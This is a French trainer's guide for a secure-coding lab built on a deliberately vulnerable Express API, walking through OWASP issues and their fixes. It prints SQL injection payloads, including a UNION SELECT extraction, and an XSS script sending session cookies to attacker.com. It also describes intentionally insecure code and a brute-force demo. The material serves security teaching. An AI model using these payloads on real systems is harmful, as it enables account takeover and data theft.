# Guide pédagogique — Formateur

Ce document accompagne le `GUIDE_APPRENANT.md`. Il contient le déroulé pédagogique, les points clés à expliquer, les questions à poser, et les nuances techniques à avoir en tête pour chaque étape.

## Organisation de la session

| Bloc | Étapes | Contenu | Durée indicative |
|---|---|---|---|
| Tronc commun | 1 à 5 | Infrastructure, authentification, injections | ~2 h |
| Approfondissement | 6 à 9 | CSRF, contrôle d'accès, session, outils | ~1 h |

Chaque étape est indépendante — elles peuvent être traitées dans n'importe quel ordre selon le niveau du groupe. L'ordre proposé suit une logique de couches : configuration globale → authentification → données → session → outillage.

**Outils des apprenants :**

- **Postman** (extension VS Code ou app desktop) — déjà recommandé dans `.vscode/extensions.json`. La collection `starter/backend/secure-coding-lab.postman_collection.json` contient toutes les requêtes pré-configurées (payloads SQLi, XSS, etc.) avec la variable `{{URL}}` à définir sur `http://localhost:5000/api/v1`.
- **Script de bruteforce** — `node starter/brute-force-demo.mjs` (cross-platform, étape 4).
- **SQLite Viewer** (extension VS Code) — pour inspecter `local.db` directement dans l'éditeur (étape 3).

**Données de seed (à communiquer aux apprenants) :**

| Email | Mot de passe | ID |
|---|---|---|
| john.doe@example.com | 123secret | 1 |
| jane.smith@example.com | 123secret | 2 |

---

## Étape 1 — A05 · Security Misconfiguration

### Ce qu'il faut expliquer

Ouvrir les DevTools → onglet Réseau → inspecter n'importe quelle réponse HTTP. Montrer en direct :
- La présence de `X-Powered-By: Express` (révèle la stack à un attaquant)
- L'absence de `Content-Security-Policy`, `X-Frame-Options`, etc.

Après correction avec `helmet()`, refaire la même inspection et comparer. Le contraste est immédiatement visible — c'est un bon point d'ancrage visuel pour introduire la notion de headers de sécurité.

### Points clés à aborder

**Sur CORS :** sans configuration, `cors()` autorise toutes les origines (`*`). Ce n'est pas un problème pour des APIs publiques, mais c'est dangereux pour une API qui utilise des cookies d'authentification. Un site tiers pourrait faire des requêtes authentifiées au nom de l'utilisateur.

**Sur helmet() :** insister sur le fait que ces headers sont des **directives au navigateur**, pas des protections serveur. Le navigateur peut les ignorer (mode extensions, navigateur modifié). Ils constituent une défense en profondeur, pas une solution complète.

**Sur CSP :** c'est le plus complexe à configurer. `helmet()` applique une politique par défaut relativement restrictive. En production, la CSP est souvent affinée au fil du temps pour correspondre exactement aux ressources nécessaires. Ne pas aller trop loin sur ce point à ce stade.

### Démonstration complémentaire

Montrer qu'un `<iframe src="http://localhost:5000">` fonctionne sans helmet. Après correction, la même iframe est bloquée (`X-Frame-Options: SAMEORIGIN`). Bonne démonstration du clickjacking.

---

## Étape 2 — A03 · Injection SQL

### Ce qu'il faut expliquer

Avant de lancer la démo, montrer le code vulnérable dans `auth.router.ts` :

```ts
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
```

Demander au groupe : *"Que se passe-t-il si email vaut `' OR '1'='1' --` ?"*. Laisser le temps de réfléchir, puis montrer la requête résultante au tableau.

### Points clés à aborder

**Pourquoi le payload utilise `123secret` et pas n'importe quel mot de passe ?** Le code vulnérable effectue deux vérifications : d'abord en SQL, puis en JavaScript (`user.password !== password`). L'injection `--` commente la vérification SQL, mais le check JS est toujours actif. Il faut donc un mot de passe qui correspond à l'utilisateur retourné — ici john.doe dont le mot de passe est connu. C'est un bon exemple de défense accidentelle : deux vulnérabilités qui s'annulent partiellement.

**Sur la validation Zod :** dans le starter, le schéma utilise `z.string()` au lieu de `z.email()`. C'est intentionnel pour permettre la démo. Aborder ce point : une validation stricte du format (`z.email()`) aurait bloqué ce payload, mais elle ne remplace pas les requêtes paramétrées — un attaquant patient peut construire des payloads qui respectent le format attendu (ex. injection dans le sous-domaine d'une adresse email du type `user@sub').union...`).

**Sur les ORM :** Drizzle génère des prepared statements — la valeur n'est jamais interpolée dans la chaîne SQL, elle est transmise comme paramètre lié (`?` en SQLite). Montrer la requête générée dans les logs serveur.

### Pour aller plus loin (groupe avancé)

Mentionner l'injection `UNION SELECT` pour l'exfiltration de données : `' UNION SELECT 1, email, password FROM users --`. C'est la technique qu'un vrai attaquant utiliserait pour extraire toute la base, pas seulement bypasser l'auth.

---

## Étape 3 — A02 · Cryptographic Failures

### Ce qu'il faut expliquer

Commencer par la démo SQLite pour rendre la vulnérabilité concrète : les mots de passe sont lisibles directement, sans avoir besoin de casser quoi que ce soit.

Expliquer ensuite **bcrypt** en trois concepts :
1. **Hachage** : fonction à sens unique — impossible de retrouver `123secret` depuis `$2a$12$...`
2. **Salt** : valeur aléatoire unique par hash, intégrée dans le hash lui-même. Même si deux utilisateurs ont le même mot de passe, leurs hashes sont différents. Protège contre les attaques par rainbow table.
3. **Work factor** (salt rounds) : le facteur 12 signifie 2¹² = 4096 itérations. Chaque tentative de bruteforce prend ~100ms sur un serveur — 1 million de tentatives = ~28 heures.

Démonstration utile : dans un REPL Node.js, appeler `bcrypt.hash("123secret", 12)` deux fois de suite et montrer que les deux hashes produits sont différents malgré le même input.

### Points clés à aborder

Même si l'injection SQL est corrigée, une fuite de la base (sauvegarde S3 mal configurée, dump accidentel, vulnérabilité serveur) expose les mots de passe. Le hachage protège les utilisateurs **après** la fuite.

Ne jamais stocker ni transmettre le mot de passe en clair après réception — l'hacher au plus tôt dans le handler. Ne jamais logger `req.body` sans filtrer les champs sensibles.

---

## Étape 4 — A07 · Bruteforce / Rate Limiting

### Ce qu'il faut expliquer

Lancer `node starter/brute-force-demo.mjs` en live. Les 10 réponses HTTP 401 illustrent l'absence de protection. Expliquer qu'un vrai attaquant n'envoie pas 10 requêtes — il en envoie des millions, en parallèle, depuis plusieurs IPs.

**Credential stuffing :** distinguer du bruteforce pur. Le credential stuffing rejoue des listes de couples email/mot de passe issus de fuites de données connues. Beaucoup d'utilisateurs réutilisant leurs mots de passe, le taux de succès est bien plus élevé qu'un bruteforce aléatoire.

### Points clés à aborder

**Limites du rate limiting par IP :** contournable avec des botnets (requêtes depuis des milliers d'IPs différentes). Des stratégies complémentaires existent :
- CAPTCHA après N échecs
- Verrouillage de compte temporaire
- Alertes email à l'utilisateur
- Vérification multi-facteur (MFA)

**Timing attack :** aborder le fait que `bcrypt.compare()` prend toujours le même temps quel que soit le résultat — c'est intentionnel. Si la comparaison était instantanée pour un email inconnu mais lente pour un email connu, un attaquant pourrait énumérer les emails valides en mesurant les temps de réponse.

---

## Étape 5 — A03 · XSS

### Ce qu'il faut expliquer

La démonstration avec `alert()` est volontairement basique pour que l'impact soit immédiat. Montrer ensuite le scénario réaliste :

```html
<script>
  document.location = 'https://attacker.com/steal?c=' + document.cookie
</script>
```

Ce commentaire exfiltre le cookie de session de chaque visiteur vers un serveur attaquant. Si le cookie n'a pas le flag `HttpOnly`, l'attaquant récupère une session valide sans connaître le mot de passe.

### Points clés à aborder

**Les trois types de XSS :**
- **Stocké** (comme ici) : le payload est sauvegardé en base et servi à tous les visiteurs
- **Réfléchi** : le payload est dans l'URL, exécuté uniquement si la victime clique sur le lien malveillant
- **DOM-based** : le payload est injecté via du JavaScript côté client, sans passer par le serveur

**Lien avec l'étape 1 :** `helmet()` ajoute `Content-Security-Policy` qui peut bloquer l'exécution de scripts inline — c'est une défense en profondeur. Mais elle ne remplace pas l'échappement : un XSS dans une balise `<p>` peut exfiltrer des données sans JavaScript (CSS injection, exfiltration via attributs).

---

## Étape 6 — CSRF

### Ce qu'il faut expliquer

L'attaque CSRF exploite le fait que le navigateur envoie **automatiquement les cookies** avec chaque requête vers un domaine, même si la requête vient d'un autre site.

Scénario à dérouler :
1. L'utilisateur est connecté à `http://localhost:5000` (cookie de session actif)
2. Il visite `attack.html` (simulant un site malveillant)
3. Le formulaire se soumet automatiquement vers `localhost:5000`
4. Le navigateur joint les cookies → le serveur pense que c'est une requête légitime

**Double Submit Cookie Pattern :** un site tiers ne peut pas lire les cookies d'un autre domaine (politique Same-Origin). Le token CSRF est dans le cookie ET dans le formulaire. Seul le site légitime peut lire son propre cookie et donc construire une requête valide.

### Points clés à aborder

**SameSite=Strict** sur le cookie de session est une défense complémentaire puissante : le navigateur refuse d'envoyer le cookie lors de requêtes cross-origin. Mais c'est un flag récent — ne pas compter dessus comme seule protection si le support navigateur doit être large.

**APIs JSON :** une API qui n'accepte que `Content-Type: application/json` est naturellement plus résistante au CSRF (les formulaires HTML ne peuvent pas envoyer ce Content-Type). Ce n'est pas une protection suffisante mais c'est un contexte à connaître.

---

## Étape 7 — A01 · Broken Access Control / IDOR

### Ce qu'il faut expliquer

C'est la vulnérabilité numéro 1 de l'OWASP Top 10 2021 — la plus répandue en production. Exemples réels à mentionner :
- Accès aux factures d'autres clients en changeant l'ID dans l'URL
- Lecture des messages privés d'autres utilisateurs
- Modification de commandes qui n'appartiennent pas à l'utilisateur

La démo est très parlante : se connecter en tant que john.doe et accéder aux données de jane.smith avec son token JWT.

### Points clés à aborder

**JWT ne suffit pas :** vérifier que le token est valide (signature correcte, non expiré) prouve l'identité de l'appelant, mais pas qu'il a le droit d'accéder à la ressource demandée. Ces deux étapes sont distinctes : **authentification** (qui es-tu ?) et **autorisation** (as-tu le droit ?).

**RBAC (Role-Based Access Control) :** pour les groupes avancés, introduire la notion de rôles. Un admin pourrait accéder à tous les profils — la logique devient `if (!isAdmin(req.user) && req.user.userId !== id)`. C'est le point de départ d'un système de permissions.

---

## Étape 8 — Session Fixation

### Ce qu'il faut expliquer

**Session fixation classique :**
1. L'attaquant génère un ID de session et l'envoie à la victime (via lien, email…)
2. La victime se connecte — le serveur associe cet ID connu à son compte
3. L'attaquant utilise cet ID pour accéder au compte

Ici, le problème est plus simple : la valeur `user123` est hardcodée et ne change jamais. N'importe qui qui connaît cette valeur peut se faire passer pour l'utilisateur.

### Points clés à aborder

**Les trois flags :**
- `HttpOnly` : empêche la lecture par JavaScript → protection contre XSS
- `SameSite=Strict` : empêche l'envoi cross-origin → protection contre CSRF
- `Secure` : HTTPS uniquement → protection contre interception réseau

**Lien avec l'étape 5 :** si le cookie n'a pas `HttpOnly`, une attaque XSS peut l'exfiltrer. C'est une illustration concrète du principe de défense en profondeur : plusieurs couches de protection indépendantes.

**Contexte de cette API :** le mécanisme d'authentification principal de cette API est le JWT, pas les cookies de session. La route `GET /login` est une démonstration didactique des flags — elle ne représente pas l'architecture réelle.

---

## Étape 9 — Audit et analyse statique

### Ce qu'il faut expliquer

**Sur `pnpm audit` :** bien distinguer les `dependencies` (embarquées en production) et les `devDependencies` (uniquement en build/dev). Une vulnérabilité dans une devDependency est moins critique qu'en production. Ne pas paniquer face à un rapport avec des `low` ou `moderate` sur des devDependencies.

**Sur les SAST :**

L'analogie la plus efficace : `pnpm audit` vérifie que les **ingrédients** achetés ne sont pas rappelés. Le SAST vérifie que **votre recette** ne contient pas d'étapes dangereuses. Les deux sont nécessaires, et aucun ne remplace la revue de code humaine.

Un SAST appliqué au projet `starter/` aurait détecté la SQL injection et le XSS **avant même l'exécution du code**. En CI/CD, cela signifie bloquer la pull request automatiquement.

### Pour aller plus loin

Mentionner l'intégration en pipeline CI/CD :

```yaml
# Exemple GitHub Actions
- run: pnpm audit --audit-level=high
- run: semgrep scan --config "p/javascript" src/ --error
```

Un pipeline qui échoue sur une vulnérabilité critique force l'équipe à traiter la dette de sécurité avant le merge.

---

## Questions fréquentes des apprenants

**"Est-ce que helmet() suffit pour être sécurisé ?"**
Non. Helmet est une couche de protection navigateur. Les vraies vulnérabilités (injection SQL, XSS dans le code, accès non contrôlé) doivent être corrigées dans le code source. Helmet réduit l'impact de certaines attaques mais ne les empêche pas toutes.

**"Pourquoi ne pas juste valider l'email avec Zod pour bloquer l'injection SQL ?"**
La validation du format est une première ligne de défense utile, mais insuffisante. Un attaquant peut construire un payload qui respecte le format email ET contient du SQL. La vraie correction est les requêtes paramétrées — elles fonctionnent quelle que soit la valeur de l'entrée.

**"JWT ou sessions — quoi choisir ?"**
JWT est stateless (le serveur ne stocke rien) → scalable, adapté aux APIs. Les sessions sont stateful (stockées serveur) → plus faciles à invalider, adaptées aux apps web traditionnelles. Les deux ont des cas d'usage légitimes.

**"bcrypt avec salt factor 12, c'est suffisant ?"**
En 2024-2025, oui pour la plupart des applications. Le factor peut être augmenté avec le temps (12 → 13 → 14…) à mesure que les GPUs deviennent plus puissants. La propriété clé : augmenter d'1 double le temps de calcul.

**"Qu'est-ce qu'un CVE ?"**
CVE = Common Vulnerabilities and Exposures. C'est un identifiant public unique pour une vulnérabilité connue (ex. `CVE-2024-12345`). `pnpm audit` compare les dépendances contre une base de CVE publiés.
